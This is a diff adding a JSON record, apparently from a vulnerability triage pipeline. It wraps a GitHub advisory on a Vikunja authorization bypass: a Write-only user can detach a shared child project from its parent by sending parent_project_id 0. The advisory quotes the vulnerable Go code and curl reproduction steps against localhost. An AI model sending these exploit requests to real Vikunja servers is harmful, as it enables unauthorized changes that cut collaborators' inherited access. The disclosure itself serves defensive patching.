@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/64725395?v=4\", \"events_url\": \"https://api.github.com/users/AntarikshaAkhileshSharma/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/AntarikshaAkhileshSharma/followers\", \"following_url\": \"https://api.github.com/users/AntarikshaAkhileshSharma/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/AntarikshaAkhileshSharma/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/AntarikshaAkhileshSharma\", \"id\": 64725395, \"login\": \"AntarikshaAkhileshSharma\", \"node_id\": \"MDQ6VXNlcjY0NzI1Mzk1\", \"organizations_url\": \"https://api.github.com/users/AntarikshaAkhileshSharma/orgs\", \"received_events_url\": \"https://api.github.com/users/AntarikshaAkhileshSharma/received_events\", \"repos_url\": \"https://api.github.com/users/AntarikshaAkhileshSharma/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/AntarikshaAkhileshSharma/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/AntarikshaAkhileshSharma/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/AntarikshaAkhileshSharma\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-55064\", \"cvss\": {\"score\": 4.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 4.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-862\", \"name\": \"Missing Authorization\"}], \"description\": \"## Summary\\n\\nThe fix for CVE-2026-35595 (project re-parenting privilege escalation) only gates reparent operations when `parent_project_id > 0`. A user with Write (but not Admin) permission on a shared child project can detach it from its parent by sending `parent_project_id: 0`, bypassing the Admin requirement. This severs the recursive CTE permission inheritance chain, potentially disrupting the project hierarchy and affecting inherited access for other collaborators.\\n\\n## Affected component\\n\\n- **Package:** go-vikunja/vikunja\\n- **Affected versions:** v2.3.0 and later (including latest unstable v2.3.0-246-9852aff4). The fix for CVE-2026-35595 was introduced in v2.3.0 but left the detach-to-root case unpatched. Fixed in 2.4.0.\\n- **Tested on:** Vikunja v2.3.0 (Docker image vikunja/vikunja:2.3.0) AND latest unstable (vikunja/vikunja:unstable, v2.3.0-246-9852aff4 built 2026-04-27)\\n\\n## Technical detail\\n\\n### Vulnerable code\\n\\n**File: `pkg/models/project.go` (lines 1009-1041)**\\n```go\\n// GHSA-2vq4-854f-5c72 / CVE-2026-35595: the recursive permission CTE\\n// cascades Admin from any owned ancestor, so moving a shared child\\n// under an attacker-owned root grants Admin on the child. Require\\n// Admin on both sides of a reparent.\\n//\\n// Only gate on non-zero ParentProjectID: the generic update handler\\n// binds a fresh struct, so an omitted parent_project_id is\\n// indistinguishable from an explicit 0. Detach-to-root is therefore\\n// out of scope here -- a proper fix needs a pointer field.\\nif project.ParentProjectID > 0 {\\n    // ... Admin check (lines 1019-1041) -- SKIPPED when ParentProjectID == 0\\n}\\n```\\n\\n**File: `pkg/models/project_permissions.go` (line 145)**\\n```go\\nif p.ParentProjectID != 0 && p.ParentProjectID != ol.ParentProjectID {\\n    // reparent permission check -- SKIPPED when ParentProjectID == 0\\n}\\n```\\n\\n**File: `pkg/models/project.go` (line 1065)**\\n```go\\ncolsToUpdate := []string{\\n    \\\"title\\\", \\\"is_archived\\\", \\\"identifier\\\", \\\"hex_color\\\",\\n    \\\"parent_project_id\\\",  // <-- ALWAYS included, writes 0 to DB\\n    \\\"position\\\",\\n}\\n```\\n\\n### Why it's exploitable\\n\\n1. The generic web handler (`pkg/web/handler/update.go:37`) creates a fresh empty `Project{}` struct -- `ParentProjectID` defaults to Go's zero value (0).\\n2. When JSON body contains `\\\"parent_project_id\\\": 0`, the struct has `ParentProjectID == 0`.\\n3. `CanUpdate` at line 145: `ParentProjectID != 0` is false -- reparent check skipped -- falls through to `CanWrite` which succeeds (attacker has Write).\\n4. `UpdateProject` at line 1018: `ParentProjectID > 0` is false -- Admin gate skipped entirely.\\n5. xorm writes `parent_project_id = 0` because `\\\"parent_project_id\\\"` is always in `colsToUpdate` with `Cols()`.\\n6. The project is detached from its parent hierarchy.\\n\\n### Precondition checklist\\n\\n- [x] Attacker has authenticated account\\n- [x] Attacker has Write permission on a child project (via direct share or team membership)\\n- [x] The target project has a non-zero parent_project_id (it's a child of another project)\\n- [x] Default Vikunja configuration (no special setup needed)\\n\\n### Reproduction\\n\\n**Prerequisites:** Two users (victim = project owner, attacker = Write-only collaborator), a parent project, and a child project shared with the attacker at Write permission.\\n\\n1. Authenticate as attacker:\\n```bash\\nTOKEN=$(curl -s -X POST http://localhost:3456/api/v1/login \\\\\\n  -H 'Content-Type: application/json' \\\\\\n  -d '{\\\"username\\\":\\\"user_a\\\",\\\"password\\\":\\\"UserAPassword1!\\\"}' | jq -r '.token')\\n```\\n\\n2. Verify attacker does NOT have Admin (delete should return 403):\\n```bash\\ncurl -s -o /dev/null -w '%{http_code}' -X DELETE http://localhost:3456/api/v1/projects/4 \\\\\\n  -H \\\"Authorization: Bearer $TOKEN\\\"\\n# Expected: 403\\n```\\n\\n3. Exploit -- detach project from parent:\\n```bash\\ncurl -s -X POST http://localhost:3456/api/v1/projects/4 \\\\\\n  -H \\\"Authorization: Bearer $TOKEN\\\" \\\\\\n  -H 'Content-Type: application/json' \\\\\\n  -d '{\\\"title\\\":\\\"Sensitive Child Project\\\",\\\"parent_project_id\\\":0}'\\n```\\n\\n4. Verify detachment:\\n```bash\\ncurl -s http://localhost:3456/api/v1/projects/4 \\\\\\n  -H \\\"Authorization: Bearer $TOKEN\\\" | jq '.parent_project_id'\\n# Returns: 0 (was: 3)\\n```\\n\\n### Evidence (3 independent runs)\\n\\n| Run | parent_project_id BEFORE | DELETE attempt (proves no Admin) | parent_project_id AFTER | Result |\\n|-----|--------------------------|----------------------------------|-------------------------|--------|\\n| 1 | 3 (child of project 3) | HTTP 403 Forbidden | null (detached to root) | CONFIRMED |\\n| 2 | 3 (child of project 3) | HTTP 403 Forbidden | null (detached to root) | CONFIRMED |\\n| 3 | 3 (child of project 3) | HTTP 403 Forbidden | null (detached to root) | CONFIRMED |\\n\\n*Note: \\\"null (detached to root)\\\" means `parent_project_id` was set to `0` in the database, making the project a root-level project with no parent.*\\n\\n## Impact\\n\\n- **Unauthorized hierarchy modification:** A user with only Write permission can detach a child project from its parent, which should require Admin permission (as established by the CVE-2026-35595 fix for non-zero reparents).\\n- **Permission inheritance disruption:** The recursive CTE permission model traverses `parent_project_id` upward. Detaching a project severs this chain, potentially causing other collaborators who inherited access through the parent to lose their permissions on the detached project.\\n- **Organizational disruption:** The project moves from a structured hierarchy to a root-level project, breaking the owner's intended organizational structure.\\n\\n## Suggested fix\\n\\nUse a pointer field `*int64` for `ParentProjectID` to distinguish between \\\"field omitted\\\" (nil) and \\\"explicitly set to 0\\\" (detach). The fix commit itself acknowledges this at `project.go:1017`: \\\"a proper fix needs a pointer field.\\\"\\n\\nAlternatively, add a dedicated `detach` boolean field or a separate API endpoint for detaching projects, with its own Admin permission check.\", \"ghsa_id\": \"GHSA-44v6-7fxq-vgf4\", \"github_reviewed_at\": \"2026-08-28T16:39:08Z\", \"html_url\": \"https://github.com/advisories/GHSA-44v6-7fxq-vgf4\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-44v6-7fxq-vgf4\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-55064\"}], \"nvd_published_at\": null, \"published_at\": \"2026-08-28T16:39:08Z\", \"references\": [\"https://github.com/go-vikunja/vikunja/security/advisories/GHSA-44v6-7fxq-vgf4\", \"https://github.com/advisories/GHSA-44v6-7fxq-vgf4\"], \"repository_advisory_url\": \"https://api.github.com/repos/go-vikunja/vikunja/security-advisories/GHSA-44v6-7fxq-vgf4\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/go-vikunja/vikunja\", \"summary\": \"Vikunja has an incomplete fix for CVE-2026-35595: Write-only user can detach shared project from parent hierarchy via parent_project_id=0\", \"type\": \"reviewed\", \"updated_at\": \"2026-08-28T16:39:09Z\", \"url\": \"https://api.github.com/advisories/GHSA-44v6-7fxq-vgf4\", \"vulnerabilities\": [{\"first_patched_version\": \"2.4.0\", \"package\": {\"ecosystem\": \"go\", \"name\": \"code.vikunja.io/api\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 2.3.0, < 2.4.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-44v6-7fxq-vgf4",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "code.vikunja.io/api: >= 2.3.0, < 2.4.0"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-35595",
+      "CVE-2026-55064"
+    ],
+    "cvss_score": 4.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "code.vikunja.io/api"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-08-28T21:56:46.650969Z",
+  "provenance": {
+    "content_sha256": "2b5b10cf6bc43cb0009c93833d473a418486d8a6e32a100b4a28ea6ead8f1d82",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-08-28T16:39:08Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-44v6-7fxq-vgf4",
+  "status": "active",
+  "title": "Vikunja has an incomplete fix for CVE-2026-35595: Write-only user can detach shared project from parent hierarchy via parent_project_id=0",
+  "updated_at": "2026-08-28T16:39:09Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-44v6-7fxq-vgf4"
+}
